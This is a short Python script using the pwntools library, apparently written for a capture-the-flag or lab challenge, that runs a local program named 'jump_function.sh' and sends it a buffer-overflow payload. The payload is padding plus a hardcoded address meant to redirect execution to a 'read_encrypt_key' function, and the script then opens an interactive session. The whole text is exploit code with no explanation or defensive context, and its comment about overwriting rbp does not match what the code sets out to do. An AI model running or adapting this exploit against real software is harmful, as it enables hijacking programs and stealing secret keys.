from pwn import *
# Start the process
p = process("./jump_function.sh")
# Get the address of the read_encrypt_key function
read_encrypt_key_addr = p64(0x55555555524f)  # Replace with the actual address
# Create the payload
payload = b"A" * 18  # Fill the buffer with 'A's (adjust the size as needed)
payload += read_encrypt_key_addr  # Overwrite rbp with the address
# Send the payload
p.sendline(payload)
# Interact with the process
p.interactive()
